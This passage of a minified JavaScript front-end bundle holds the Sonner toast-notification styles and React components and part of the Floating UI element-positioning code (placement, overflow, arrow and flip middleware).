45%);--error-bg: hsl(359, 100%, 97%);--error-border: hsl(359, 100%, 94%);--error-text: hsl(360, 100%, 45%)}[data-sonner-toaster][data-theme=light] [data-sonner-toast][data-invert=true]{--normal-bg: #000;--normal-border: hsl(0, 0%, 20%);--normal-text: var(--gray1)}[data-sonner-toaster][data-theme=dark] [data-sonner-toast][data-invert=true]{--normal-bg: #fff;--normal-border: var(--gray3);--normal-text: var(--gray12)}[data-sonner-toaster][data-theme=dark]{--normal-bg: #000;--normal-bg-hover: hsl(0, 0%, 12%);--normal-border: hsl(0, 0%, 20%);--normal-border-hover: hsl(0, 0%, 25%);--normal-text: var(--gray1);--success-bg: hsl(150, 100%, 6%);--success-border: hsl(147, 100%, 12%);--success-text: hsl(150, 86%, 65%);--info-bg: hsl(215, 100%, 6%);--info-border: hsl(223, 100%, 12%);--info-text: hsl(216, 87%, 65%);--warning-bg: hsl(64, 100%, 6%);--warning-border: hsl(60, 100%, 12%);--warning-text: hsl(46, 87%, 65%);--error-bg: hsl(358, 76%, 10%);--error-border: hsl(357, 89%, 16%);--error-text: hsl(358, 100%, 81%)}[data-sonner-toaster][data-theme=dark] [data-sonner-toast] [data-close-button]{background:var(--normal-bg);border-color:var(--normal-border);color:var(--normal-text)}[data-sonner-toaster][data-theme=dark] [data-sonner-toast] [data-close-button]:hover{background:var(--normal-bg-hover);border-color:var(--normal-border-hover)}[data-rich-colors=true][data-sonner-toast][data-type=success],[data-rich-colors=true][data-sonner-toast][data-type=success] [data-close-button]{background:var(--success-bg);border-color:var(--success-border);color:var(--success-text)}[data-rich-colors=true][data-sonner-toast][data-type=info],[data-rich-colors=true][data-sonner-toast][data-type=info] [data-close-button]{background:var(--info-bg);border-color:var(--info-border);color:var(--info-text)}[data-rich-colors=true][data-sonner-toast][data-type=warning],[data-rich-colors=true][data-sonner-toast][data-type=warning] [data-close-button]{background:var(--warning-bg);border-color:var(--warning-border);color:var(--warning-text)}[data-rich-colors=true][data-sonner-toast][data-type=error],[data-rich-colors=true][data-sonner-toast][data-type=error] [data-close-button]{background:var(--error-bg);border-color:var(--error-border);color:var(--error-text)}.sonner-loading-wrapper{--size: 16px;height:var(--size);width:var(--size);position:absolute;inset:0;z-index:10}.sonner-loading-wrapper[data-visible=false]{transform-origin:center;animation:sonner-fade-out .2s ease forwards}.sonner-spinner{position:relative;top:50%;left:50%;height:var(--size);width:var(--size)}.sonner-loading-bar{animation:sonner-spin 1.2s linear infinite;background:var(--gray11);border-radius:6px;height:8%;left:-10%;position:absolute;top:-3.9%;width:24%}.sonner-loading-bar:nth-child(1){animation-delay:-1.2s;transform:rotate(.0001deg) translate(146%)}.sonner-loading-bar:nth-child(2){animation-delay:-1.1s;transform:rotate(30deg) translate(146%)}.sonner-loading-bar:nth-child(3){animation-delay:-1s;transform:rotate(60deg) translate(146%)}.sonner-loading-bar:nth-child(4){animation-delay:-.9s;transform:rotate(90deg) translate(146%)}.sonner-loading-bar:nth-child(5){animation-delay:-.8s;transform:rotate(120deg) translate(146%)}.sonner-loading-bar:nth-child(6){animation-delay:-.7s;transform:rotate(150deg) translate(146%)}.sonner-loading-bar:nth-child(7){animation-delay:-.6s;transform:rotate(180deg) translate(146%)}.sonner-loading-bar:nth-child(8){animation-delay:-.5s;transform:rotate(210deg) translate(146%)}.sonner-loading-bar:nth-child(9){animation-delay:-.4s;transform:rotate(240deg) translate(146%)}.sonner-loading-bar:nth-child(10){animation-delay:-.3s;transform:rotate(270deg) translate(146%)}.sonner-loading-bar:nth-child(11){animation-delay:-.2s;transform:rotate(300deg) translate(146%)}.sonner-loading-bar:nth-child(12){animation-delay:-.1s;transform:rotate(330deg) translate(146%)}@keyframes sonner-fade-in{0%{opacity:0;transform:scale(.8)}to{opacity:1;transform:scale(1)}}@keyframes sonner-fade-out{0%{opacity:1;transform:scale(1)}to{opacity:0;transform:scale(.8)}}@keyframes sonner-spin{0%{opacity:1}to{opacity:.15}}@media (prefers-reduced-motion){[data-sonner-toast],[data-sonner-toast]>*,.sonner-loading-bar{transition:none!important;animation:none!important}}.sonner-loader{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);transform-origin:center;transition:opacity .2s,transform .2s}.sonner-loader[data-visible=false]{opacity:0;transform:scale(.8) translate(-50%,-50%)}
`);
function ni(e) {
    return e.label !== void 0;
}
var xw = 3,
    ww = "32px",
    Sw = "16px",
    Np = 4e3,
    bw = 356,
    kw = 14,
    Cw = 20,
    Ew = 200;
function gt(...e) {
    return e.filter(Boolean).join(" ");
}
function Nw(e) {
    let [t, n] = e.split("-"),
        r = [];
    return t && r.push(t), n && r.push(n), r;
}
var Pw = (e) => {
    var t, n, r, o, s, i, a, l, u, d, p;
    let {
            invert: m,
            toast: f,
            unstyled: S,
            interacting: v,
            setHeights: w,
            visibleToasts: g,
            heights: h,
            index: y,
            toasts: b,
            expanded: k,
            removeToast: C,
            defaultRichColors: E,
            closeButton: j,
            style: _,
            cancelButtonStyle: M,
            actionButtonStyle: H,
            className: D = "",
            descriptionClassName: G = "",
            duration: O,
            position: $,
            gap: B,
            loadingIcon: I,
            expandByDefault: N,
            classNames: T,
            icons: L,
            closeButtonAriaLabel: V = "Close toast",
            pauseWhenPageIsHidden: U,
        } = e,
        [q, X] = A.useState(null),
        [ne, fe] = A.useState(null),
        [Z, an] = A.useState(!1),
        [ct, ut] = A.useState(!1),
        [ge, ln] = A.useState(!1),
        [dt, Ht] = A.useState(!1),
        [br, Co] = A.useState(!1),
        [kr, Kn] = A.useState(0),
        [jt, Gu] = A.useState(0),
        Eo = A.useRef(f.duration || O || Np),
        qu = A.useRef(null),
        Qn = A.useRef(null),
        fy = y === 0,
        my = y + 1 <= g,
        tt = f.type,
        Cr = f.dismissible !== !1,
        hy = f.className || "",
        gy = f.descriptionClassName || "",
        _s = A.useMemo(() => h.findIndex((W) => W.toastId === f.id) || 0, [h, f.id]),
        yy = A.useMemo(() => {
            var W;
            return (W = f.closeButton) != null ? W : j;
        }, [f.closeButton, j]),
        Xu = A.useMemo(() => f.duration || O || Np, [f.duration, O]),
        Ra = A.useRef(0),
        Er = A.useRef(0),
        Yu = A.useRef(0),
        Nr = A.useRef(null),
        [vy, xy] = $.split("-"),
        Zu = A.useMemo(() => h.reduce((W, re, le) => (le >= _s ? W : W + re.height), 0), [h, _s]),
        Ju = dw(),
        wy = f.invert || m,
        Aa = tt === "loading";
    (Er.current = A.useMemo(() => _s * B + Zu, [_s, Zu])),
        A.useEffect(() => {
            Eo.current = Xu;
        }, [Xu]),
        A.useEffect(() => {
            an(!0);
        }, []),
        A.useEffect(() => {
            let W = Qn.current;
            if (W) {
                let re = W.getBoundingClientRect().height;
                return (
                    Gu(re),
                    w((le) => [{ toastId: f.id, height: re, position: f.position }, ...le]),
                    () => w((le) => le.filter((pt) => pt.toastId !== f.id))
                );
            }
        }, [w, f.id]),
        A.useLayoutEffect(() => {
            if (!Z) return;
            let W = Qn.current,
                re = W.style.height;
            W.style.height = "auto";
            let le = W.getBoundingClientRect().height;
            (W.style.height = re),
                Gu(le),
                w((pt) =>
                    pt.find((ft) => ft.toastId === f.id)
                        ? pt.map((ft) => (ft.toastId === f.id ? { ...ft, height: le } : ft))
                        : [{ toastId: f.id, height: le, position: f.position }, ...pt]
                );
        }, [Z, f.title, f.description, w, f.id]);
    let cn = A.useCallback(() => {
        ut(!0),
            Kn(Er.current),
            w((W) => W.filter((re) => re.toastId !== f.id)),
            setTimeout(() => {
                C(f);
            }, Ew);
    }, [f, C, w, Er]);
    A.useEffect(() => {
        if ((f.promise && tt === "loading") || f.duration === 1 / 0 || f.type === "loading") return;
        let W;
        return (
            k || v || (U && Ju)
                ? (() => {
                      if (Yu.current < Ra.current) {
                          let re = new Date().getTime() - Ra.current;
                          Eo.current = Eo.current - re;
                      }
                      Yu.current = new Date().getTime();
                  })()
                : Eo.current !== 1 / 0 &&
                  ((Ra.current = new Date().getTime()),
                  (W = setTimeout(() => {
                      var re;
                      (re = f.onAutoClose) == null || re.call(f, f), cn();
                  }, Eo.current))),
            () => clearTimeout(W)
        );
    }, [k, v, f, tt, U, Ju, cn]),
        A.useEffect(() => {
            f.delete && cn();
        }, [cn, f.delete]);
    function Sy() {
        var W, re, le;
        return L != null && L.loading
            ? A.createElement(
                  "div",
                  {
                      className: gt(
                          T == null ? void 0 : T.loader,
                          (W = f == null ? void 0 : f.classNames) == null ? void 0 : W.loader,
                          "sonner-loader"
                      ),
                      "data-visible": tt === "loading",
                  },
                  L.loading
              )
            : I
              ? A.createElement(
                    "div",
                    {
                        className: gt(
                            T == null ? void 0 : T.loader,
                            (re = f == null ? void 0 : f.classNames) == null ? void 0 : re.loader,
                            "sonner-loader"
                        ),
                        "data-visible": tt === "loading",
                    },
                    I
                )
              : A.createElement(sw, {
                    className: gt(
                        T == null ? void 0 : T.loader,
                        (le = f == null ? void 0 : f.classNames) == null ? void 0 : le.loader
                    ),
                    visible: tt === "loading",
                });
    }
    return A.createElement(
        "li",
        {
            tabIndex: 0,
            ref: Qn,
            className: gt(
                D,
                hy,
                T == null ? void 0 : T.toast,
                (t = f == null ? void 0 : f.classNames) == null ? void 0 : t.toast,
                T == null ? void 0 : T.default,
                T == null ? void 0 : T[tt],
                (n = f == null ? void 0 : f.classNames) == null ? void 0 : n[tt]
            ),
            "data-sonner-toast": "",
            "data-rich-colors": (r = f.richColors) != null ? r : E,
            "data-styled": !(f.jsx || f.unstyled || S),
            "data-mounted": Z,
            "data-promise": !!f.promise,
            "data-swiped": br,
            "data-removed": ct,
            "data-visible": my,
            "data-y-position": vy,
            "data-x-position": xy,
            "data-index": y,
            "data-front": fy,
            "data-swiping": ge,
            "data-dismissible": Cr,
            "data-type": tt,
            "data-invert": wy,
            "data-swipe-out": dt,
            "data-swipe-direction": ne,
            "data-expanded": !!(k || (N && Z)),
            style: {
                "--index": y,
                "--toasts-before": y,
                "--z-index": b.length - y,
                "--offset": `${ct ? kr : Er.current}px`,
                "--initial-height": N ? "auto" : `${jt}px`,
                ..._,
                ...f.style,
            },
            onDragEnd: () => {
                ln(!1), X(null), (Nr.current = null);
            },
            onPointerDown: (W) => {
                Aa ||
                    !Cr ||
                    ((qu.current = new Date()),
                    Kn(Er.current),
                    W.target.setPointerCapture(W.pointerId),
                    W.target.tagName !== "BUTTON" && (ln(!0), (Nr.current = { x: W.clientX, y: W.clientY })));
            },
            onPointerUp: () => {
                var W, re, le, pt;
                if (dt || !Cr) return;
                Nr.current = null;
                let ft = Number(
                        ((W = Qn.current) == null
                            ? void 0
                            : W.style.getPropertyValue("--swipe-amount-x").replace("px", "")) || 0
                    ),
                    un = Number(
                        ((re = Qn.current) == null
                            ? void 0
                            : re.style.getPropertyValue("--swipe-amount-y").replace("px", "")) || 0
                    ),
                    Gn = new Date().getTime() - ((le = qu.current) == null ? void 0 : le.getTime()),
                    mt = q === "x" ? ft : un,
                    dn = Math.abs(mt) / Gn;
                if (Math.abs(mt) >= Cw || dn > 0.11) {
                    Kn(Er.current),
                        (pt = f.onDismiss) == null || pt.call(f, f),
                        fe(q === "x" ? (ft > 0 ? "right" : "left") : un > 0 ? "down" : "up"),
                        cn(),
                        Ht(!0),
                        Co(!1);
                    return;
                }
                ln(!1), X(null);
            },
            onPointerMove: (W) => {
                var re, le, pt, ft;
                if (!Nr.current || !Cr || ((re = window.getSelection()) == null ? void 0 : re.toString().length) > 0)
                    return;
                let un = W.clientY - Nr.current.y,
                    Gn = W.clientX - Nr.current.x,
                    mt = (le = e.swipeDirections) != null ? le : Nw($);
                !q && (Math.abs(Gn) > 1 || Math.abs(un) > 1) && X(Math.abs(Gn) > Math.abs(un) ? "x" : "y");
                let dn = { x: 0, y: 0 };
                q === "y"
                    ? (mt.includes("top") || mt.includes("bottom")) &&
                      ((mt.includes("top") && un < 0) || (mt.includes("bottom") && un > 0)) &&
                      (dn.y = un)
                    : q === "x" &&
                      (mt.includes("left") || mt.includes("right")) &&
                      ((mt.includes("left") && Gn < 0) || (mt.includes("right") && Gn > 0)) &&
                      (dn.x = Gn),
                    (Math.abs(dn.x) > 0 || Math.abs(dn.y) > 0) && Co(!0),
                    (pt = Qn.current) == null || pt.style.setProperty("--swipe-amount-x", `${dn.x}px`),
                    (ft = Qn.current) == null || ft.style.setProperty("--swipe-amount-y", `${dn.y}px`);
            },
        },
        yy && !f.jsx
            ? A.createElement(
                  "button",
                  {
                      "aria-label": V,
                      "data-disabled": Aa,
                      "data-close-button": !0,
                      onClick:
                          Aa || !Cr
                              ? () => {}
                              : () => {
                                    var W;
                                    cn(), (W = f.onDismiss) == null || W.call(f, f);
                                },
                      className: gt(
                          T == null ? void 0 : T.closeButton,
                          (o = f == null ? void 0 : f.classNames) == null ? void 0 : o.closeButton
                      ),
                  },
                  (s = L == null ? void 0 : L.close) != null ? s : uw
              )
            : null,
        f.jsx || x.isValidElement(f.title)
            ? f.jsx
                ? f.jsx
                : typeof f.title == "function"
                  ? f.title()
                  : f.title
            : A.createElement(
                  A.Fragment,
                  null,
                  tt || f.icon || f.promise
                      ? A.createElement(
                            "div",
                            {
                                "data-icon": "",
                                className: gt(
                                    T == null ? void 0 : T.icon,
                                    (i = f == null ? void 0 : f.classNames) == null ? void 0 : i.icon
                                ),
                            },
                            f.promise || (f.type === "loading" && !f.icon) ? f.icon || Sy() : null,
                            f.type !== "loading" ? f.icon || (L == null ? void 0 : L[tt]) || rw(tt) : null
                        )
                      : null,
                  A.createElement(
                      "div",
                      {
                          "data-content": "",
                          className: gt(
                              T == null ? void 0 : T.content,
                              (a = f == null ? void 0 : f.classNames) == null ? void 0 : a.content
                          ),
                      },
                      A.createElement(
                          "div",
                          {
                              "data-title": "",
                              className: gt(
                                  T == null ? void 0 : T.title,
                                  (l = f == null ? void 0 : f.classNames) == null ? void 0 : l.title
                              ),
                          },
                          typeof f.title == "function" ? f.title() : f.title
                      ),
                      f.description
                          ? A.createElement(
                                "div",
                                {
                                    "data-description": "",
                                    className: gt(
                                        G,
                                        gy,
                                        T == null ? void 0 : T.description,
                                        (u = f == null ? void 0 : f.classNames) == null ? void 0 : u.description
                                    ),
                                },
                                typeof f.description == "function" ? f.description() : f.description
                            )
                          : null
                  ),
                  x.isValidElement(f.cancel)
                      ? f.cancel
                      : f.cancel && ni(f.cancel)
                        ? A.createElement(
                              "button",
                              {
                                  "data-button": !0,
                                  "data-cancel": !0,
                                  style: f.cancelButtonStyle || M,
                                  onClick: (W) => {
                                      var re, le;
                                      ni(f.cancel) &&
                                          Cr &&
                                          ((le = (re = f.cancel).onClick) == null || le.call(re, W), cn());
                                  },
                                  className: gt(
                                      T == null ? void 0 : T.cancelButton,
                                      (d = f == null ? void 0 : f.classNames) == null ? void 0 : d.cancelButton
                                  ),
                              },
                              f.cancel.label
                          )
                        : null,
                  x.isValidElement(f.action)
                      ? f.action
                      : f.action && ni(f.action)
                        ? A.createElement(
                              "button",
                              {
                                  "data-button": !0,
                                  "data-action": !0,
                                  style: f.actionButtonStyle || H,
                                  onClick: (W) => {
                                      var re, le;
                                      ni(f.action) &&
                                          ((le = (re = f.action).onClick) == null || le.call(re, W),
                                          !W.defaultPrevented && cn());
                                  },
                                  className: gt(
                                      T == null ? void 0 : T.actionButton,
                                      (p = f == null ? void 0 : f.classNames) == null ? void 0 : p.actionButton
                                  ),
                              },
                              f.action.label
                          )
                        : null
              )
    );
};
function Pp() {
    if (typeof window > "u" || typeof document > "u") return "ltr";
    let e = document.documentElement.getAttribute("dir");
    return e === "auto" || !e ? window.getComputedStyle(document.documentElement).direction : e;
}
function Tw(e, t) {
    let n = {};
    return (
        [e, t].forEach((r, o) => {
            let s = o === 1,
                i = s ? "--mobile-offset" : "--offset",
                a = s ? Sw : ww;
            function l(u) {
                ["top", "right", "bottom", "left"].forEach((d) => {
                    n[`${i}-${d}`] = typeof u == "number" ? `${u}px` : u;
                });
            }
            typeof r == "number" || typeof r == "string"
                ? l(r)
                : typeof r == "object"
                  ? ["top", "right", "bottom", "left"].forEach((u) => {
                        r[u] === void 0
                            ? (n[`${i}-${u}`] = a)
                            : (n[`${i}-${u}`] = typeof r[u] == "number" ? `${r[u]}px` : r[u]);
                    })
                  : l(a);
        }),
        n
    );
}
var jw = x.forwardRef(function (e, t) {
    let {
            invert: n,
            position: r = "bottom-right",
            hotkey: o = ["altKey", "KeyT"],
            expand: s,
            closeButton: i,
            className: a,
            offset: l,
            mobileOffset: u,
            theme: d = "light",
            richColors: p,
            duration: m,
            style: f,
            visibleToasts: S = xw,
            toastOptions: v,
            dir: w = Pp(),
            gap: g = kw,
            loadingIcon: h,
            icons: y,
            containerAriaLabel: b = "Notifications",
            pauseWhenPageIsHidden: k,
        } = e,
        [C, E] = A.useState([]),
        j = A.useMemo(
            () => Array.from(new Set([r].concat(C.filter((U) => U.position).map((U) => U.position)))),
            [C, r]
        ),
        [_, M] = A.useState([]),
        [H, D] = A.useState(!1),
        [G, O] = A.useState(!1),
        [$, B] = A.useState(
            d !== "system"
                ? d
                : typeof window < "u" && window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches
                  ? "dark"
                  : "light"
        ),
        I = A.useRef(null),
        N = o.join("+").replace(/Key/g, "").replace(/Digit/g, ""),
        T = A.useRef(null),
        L = A.useRef(!1),
        V = A.useCallback((U) => {
            E((q) => {
                var X;
                return (
                    ((X = q.find((ne) => ne.id === U.id)) != null && X.delete) || Ue.dismiss(U.id),
                    q.filter(({ id: ne }) => ne !== U.id)
                );
            });
        }, []);
    return (
        A.useEffect(
            () =>
                Ue.subscribe((U) => {
                    if (U.dismiss) {
                        E((q) => q.map((X) => (X.id === U.id ? { ...X, delete: !0 } : X)));
                        return;
                    }
                    setTimeout(() => {
                        Eh.flushSync(() => {
                            E((q) => {
                                let X = q.findIndex((ne) => ne.id === U.id);
                                return X !== -1 ? [...q.slice(0, X), { ...q[X], ...U }, ...q.slice(X + 1)] : [U, ...q];
                            });
                        });
                    });
                }),
            []
        ),
        A.useEffect(() => {
            if (d !== "system") {
                B(d);
                return;
            }
            if (
                (d === "system" &&
                    (window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches
                        ? B("dark")
                        : B("light")),
                typeof window > "u")
            )
                return;
            let U = window.matchMedia("(prefers-color-scheme: dark)");
            try {
                U.addEventListener("change", ({ matches: q }) => {
                    B(q ? "dark" : "light");
                });
            } catch {
                U.addListener(({ matches: X }) => {
                    try {
                        B(X ? "dark" : "light");
                    } catch (ne) {
                        console.error(ne);
                    }
                });
            }
        }, [d]),
        A.useEffect(() => {
            C.length <= 1 && D(!1);
        }, [C]),
        A.useEffect(() => {
            let U = (q) => {
                var X, ne;
                o.every((fe) => q[fe] || q.code === fe) && (D(!0), (X = I.current) == null || X.focus()),
                    q.code === "Escape" &&
                        (document.activeElement === I.current ||
                            ((ne = I.current) != null && ne.contains(document.activeElement))) &&
                        D(!1);
            };
            return document.addEventListener("keydown", U), () => document.removeEventListener("keydown", U);
        }, [o]),
        A.useEffect(() => {
            if (I.current)
                return () => {
                    T.current && (T.current.focus({ preventScroll: !0 }), (T.current = null), (L.current = !1));
                };
        }, [I.current]),
        A.createElement(
            "section",
            {
                ref: t,
                "aria-label": `${b} ${N}`,
                tabIndex: -1,
                "aria-live": "polite",
                "aria-relevant": "additions text",
                "aria-atomic": "false",
                suppressHydrationWarning: !0,
            },
            j.map((U, q) => {
                var X;
                let [ne, fe] = U.split("-");
                return C.length
                    ? A.createElement(
                          "ol",
                          {
                              key: U,
                              dir: w === "auto" ? Pp() : w,
                              tabIndex: -1,
                              ref: I,
                              className: a,
                              "data-sonner-toaster": !0,
                              "data-theme": $,
                              "data-y-position": ne,
                              "data-lifted": H && C.length > 1 && !s,
                              "data-x-position": fe,
                              style: {
                                  "--front-toast-height": `${((X = _[0]) == null ? void 0 : X.height) || 0}px`,
                                  "--width": `${bw}px`,
                                  "--gap": `${g}px`,
                                  ...f,
                                  ...Tw(l, u),
                              },
                              onBlur: (Z) => {
                                  L.current &&
                                      !Z.currentTarget.contains(Z.relatedTarget) &&
                                      ((L.current = !1),
                                      T.current && (T.current.focus({ preventScroll: !0 }), (T.current = null)));
                              },
                              onFocus: (Z) => {
                                  (Z.target instanceof HTMLElement && Z.target.dataset.dismissible === "false") ||
                                      L.current ||
                                      ((L.current = !0), (T.current = Z.relatedTarget));
                              },
                              onMouseEnter: () => D(!0),
                              onMouseMove: () => D(!0),
                              onMouseLeave: () => {
                                  G || D(!1);
                              },
                              onDragEnd: () => D(!1),
                              onPointerDown: (Z) => {
                                  (Z.target instanceof HTMLElement && Z.target.dataset.dismissible === "false") ||
                                      O(!0);
                              },
                              onPointerUp: () => O(!1),
                          },
                          C.filter((Z) => (!Z.position && q === 0) || Z.position === U).map((Z, an) => {
                              var ct, ut;
                              return A.createElement(Pw, {
                                  key: Z.id,
                                  icons: y,
                                  index: an,
                                  toast: Z,
                                  defaultRichColors: p,
                                  duration: (ct = v == null ? void 0 : v.duration) != null ? ct : m,
                                  className: v == null ? void 0 : v.className,
                                  descriptionClassName: v == null ? void 0 : v.descriptionClassName,
                                  invert: n,
                                  visibleToasts: S,
                                  closeButton: (ut = v == null ? void 0 : v.closeButton) != null ? ut : i,
                                  interacting: G,
                                  position: U,
                                  style: v == null ? void 0 : v.style,
                                  unstyled: v == null ? void 0 : v.unstyled,
                                  classNames: v == null ? void 0 : v.classNames,
                                  cancelButtonStyle: v == null ? void 0 : v.cancelButtonStyle,
                                  actionButtonStyle: v == null ? void 0 : v.actionButtonStyle,
                                  removeToast: V,
                                  toasts: C.filter((ge) => ge.position == Z.position),
                                  heights: _.filter((ge) => ge.position == Z.position),
                                  setHeights: M,
                                  expandByDefault: s,
                                  gap: g,
                                  loadingIcon: h,
                                  expanded: H,
                                  pauseWhenPageIsHidden: k,
                                  swipeDirections: e.swipeDirections,
                              });
                          })
                      )
                    : null;
            })
        )
    );
});
const Rw = ({ ...e }) => {
        const { theme: t = "system" } = nw();
        return c.jsx(jw, {
            theme: t,
            className: "toaster group",
            toastOptions: {
                classNames: {
                    toast: "group toast group-[.toaster]:bg-background group-[.toaster]:text-foreground group-[.toaster]:border-border group-[.toaster]:shadow-lg",
                    description: "group-[.toast]:text-muted-foreground",
                    actionButton: "group-[.toast]:bg-primary group-[.toast]:text-primary-foreground",
                    cancelButton: "group-[.toast]:bg-muted group-[.toast]:text-muted-foreground",
                },
            },
            ...e,
        });
    },
    Aw = ["top", "right", "bottom", "left"],
    $n = Math.min,
    Ge = Math.max,
    qi = Math.round,
    ri = Math.floor,
    Ft = (e) => ({ x: e, y: e }),
    Mw = { left: "right", right: "left", bottom: "top", top: "bottom" },
    _w = { start: "end", end: "start" };
function kc(e, t, n) {
    return Ge(e, $n(t, n));
}
function rn(e, t) {
    return typeof e == "function" ? e(t) : e;
}
function on(e) {
    return e.split("-")[0];
}
function wo(e) {
    return e.split("-")[1];
}
function Ou(e) {
    return e === "x" ? "y" : "x";
}
function Iu(e) {
    return e === "y" ? "height" : "width";
}
const Lw = new Set(["top", "bottom"]);
function It(e) {
    return Lw.has(on(e)) ? "y" : "x";
}
function Du(e) {
    return Ou(It(e));
}
function Ow(e, t, n) {
    n === void 0 && (n = !1);
    const r = wo(e),
        o = Du(e),
        s = Iu(o);
    let i = o === "x" ? (r === (n ? "end" : "start") ? "right" : "left") : r === "start" ? "bottom" : "top";
    return t.reference[s] > t.floating[s] && (i = Xi(i)), [i, Xi(i)];
}
function Iw(e) {
    const t = Xi(e);
    return [Cc(e), t, Cc(t)];
}
function Cc(e) {
    return e.replace(/start|end/g, (t) => _w[t]);
}
const Tp = ["left", "right"],
    jp = ["right", "left"],
    Dw = ["top", "bottom"],
    zw = ["bottom", "top"];
function Fw(e, t, n) {
    switch (e) {
        case "top":
        case "bottom":
            return n ? (t ? jp : Tp) : t ? Tp : jp;
        case "left":
        case "right":
            return t ? Dw : zw;
        default:
            return [];
    }
}
function Uw(e, t, n, r) {
    const o = wo(e);
    let s = Fw(on(e), n === "start", r);
    return o && ((s = s.map((i) => i + "-" + o)), t && (s = s.concat(s.map(Cc)))), s;
}
function Xi(e) {
    return e.replace(/left|right|bottom|top/g, (t) => Mw[t]);
}
function $w(e) {
    return { top: 0, right: 0, bottom: 0, left: 0, ...e };
}
function vg(e) {
    return typeof e != "number" ? $w(e) : { top: e, right: e, bottom: e, left: e };
}
function Yi(e) {
    const { x: t, y: n, width: r, height: o } = e;
    return { width: r, height: o, top: n, left: t, right: t + r, bottom: n + o, x: t, y: n };
}
function Rp(e, t, n) {
    let { reference: r, floating: o } = e;
    const s = It(t),
        i = Du(t),
        a = Iu(i),
        l = on(t),
        u = s === "y",
        d = r.x + r.width / 2 - o.width / 2,
        p = r.y + r.height / 2 - o.height / 2,
        m = r[a] / 2 - o[a] / 2;
    let f;
    switch (l) {
        case "top":
            f = { x: d, y: r.y - o.height };
            break;
        case "bottom":
            f = { x: d, y: r.y + r.height };
            break;
        case "right":
            f = { x: r.x + r.width, y: p };
            break;
        case "left":
            f = { x: r.x - o.width, y: p };
            break;
        default:
            f = { x: r.x, y: r.y };
    }
    switch (wo(t)) {
        case "start":
            f[i] -= m * (n && u ? -1 : 1);
            break;
        case "end":
            f[i] += m * (n && u ? -1 : 1);
            break;
    }
    return f;
}
const Hw = async (e, t, n) => {
    const { placement: r = "bottom", strategy: o = "absolute", middleware: s = [], platform: i } = n,
        a = s.filter(Boolean),
        l = await (i.isRTL == null ? void 0 : i.isRTL(t));
    let u = await i.getElementRects({ reference: e, floating: t, strategy: o }),
        { x: d, y: p } = Rp(u, r, l),
        m = r,
        f = {},
        S = 0;
    for (let v = 0; v < a.length; v++) {
        const { name: w, fn: g } = a[v],
            {
                x: h,
                y,
                data: b,
                reset: k,
            } = await g({
                x: d,
                y: p,
                initialPlacement: r,
                placement: m,
                strategy: o,
                middlewareData: f,
                rects: u,
                platform: i,
                elements: { reference: e, floating: t },
            });
        (d = h ?? d),
            (p = y ?? p),
            (f = { ...f, [w]: { ...f[w], ...b } }),
            k &&
                S <= 50 &&
                (S++,
                typeof k == "object" &&
                    (k.placement && (m = k.placement),
                    k.rects &&
                        (u =
                            k.rects === !0
                                ? await i.getElementRects({ reference: e, floating: t, strategy: o })
                                : k.rects),
                    ({ x: d, y: p } = Rp(u, m, l))),
                (v = -1));
    }
    return { x: d, y: p, placement: m, strategy: o, middlewareData: f };
};
async function hs(e, t) {
    var n;
    t === void 0 && (t = {});
    const { x: r, y: o, platform: s, rects: i, elements: a, strategy: l } = e,
        {
            boundary: u = "clippingAncestors",
            rootBoundary: d = "viewport",
            elementContext: p = "floating",
            altBoundary: m = !1,
            padding: f = 0,
        } = rn(t, e),
        S = vg(f),
        w = a[m ? (p === "floating" ? "reference" : "floating") : p],
        g = Yi(
            await s.getClippingRect({
                element:
                    (n = await (s.isElement == null ? void 0 : s.isElement(w))) == null || n
                        ? w
                        : w.contextElement ||
                          (await (s.getDocumentElement == null ? void 0 : s.getDocumentElement(a.floating))),
                boundary: u,
                rootBoundary: d,
                strategy: l,
            })
        ),
        h = p === "floating" ? { x: r, y: o, width: i.floating.width, height: i.floating.height } : i.reference,
        y = await (s.getOffsetParent == null ? void 0 : s.getOffsetParent(a.floating)),
        b = (await (s.isElement == null ? void 0 : s.isElement(y)))
            ? (await (s.getScale == null ? void 0 : s.getScale(y))) || { x: 1, y: 1 }
            : { x: 1, y: 1 },
        k = Yi(
            s.convertOffsetParentRelativeRectToViewportRelativeRect
                ? await s.convertOffsetParentRelativeRectToViewportRelativeRect({
                      elements: a,
                      rect: h,
                      offsetParent: y,
                      strategy: l,
                  })
                : h
        );
    return {
        top: (g.top - k.top + S.top) / b.y,
        bottom: (k.bottom - g.bottom + S.bottom) / b.y,
        left: (g.left - k.left + S.left) / b.x,
        right: (k.right - g.right + S.right) / b.x,
    };
}
const Bw = (e) => ({
        name: "arrow",
        options: e,
        async fn(t) {
            const { x: n, y: r, placement: o, rects: s, platform: i, elements: a, middlewareData: l } = t,
                { element: u, padding: d = 0 } = rn(e, t) || {};
            if (u == null) return {};
            const p = vg(d),
                m = { x: n, y: r },
                f = Du(o),
                S = Iu(f),
                v = await i.getDimensions(u),
                w = f === "y",
                g = w ? "top" : "left",
                h = w ? "bottom" : "right",
                y = w ? "clientHeight" : "clientWidth",
                b = s.reference[S] + s.reference[f] - m[f] - s.floating[S],
                k = m[f] - s.reference[f],
                C = await (i.getOffsetParent == null ? void 0 : i.getOffsetParent(u));
            let E = C ? C[y] : 0;
            (!E || !(await (i.isElement == null ? void 0 : i.isElement(C)))) && (E = a.floating[y] || s.floating[S]);
            const j = b / 2 - k / 2,
                _ = E / 2 - v[S] / 2 - 1,
                M = $n(p[g], _),
                H = $n(p[h], _),
                D = M,
                G = E - v[S] - H,
                O = E / 2 - v[S] / 2 + j,
                $ = kc(D, O, G),
                B = !l.arrow && wo(o) != null && O !== $ && s.reference[S] / 2 - (O < D ? M : H) - v[S] / 2 < 0,
                I = B ? (O < D ? O - D : O - G) : 0;
            return {
                [f]: m[f] + I,
                data: { [f]: $, centerOffset: O - $ - I, ...(B && { alignmentOffset: I }) },
                reset: B,
            };
        },
    }),
    Vw = function (e) {
        return (
            e === void 0 && (e = {}),
            {
                name: "flip",
                options: e,
                async fn(t) {
                    var n, r;
                    const {
                            placement: o,
                            middlewareData: s,
                            rects: i,
                            initialPlacement: a,
                            platform: l,
                            elements: u,
                        } = t,
                        {
                            mainAxis: d = !0,
                            crossAxis: p = !0,
                            fallbackPlacements: m,
                            fallbackStrategy: f = "bestFit",
                            fallbackAxisSideDirection: S = "none",
                            flipAlignment: v = !0,
                            ...w
                        } = rn(e, t);
                    if ((n = s.arrow) != null && n.alignmentOffset) return {};
                    const g = on(o),
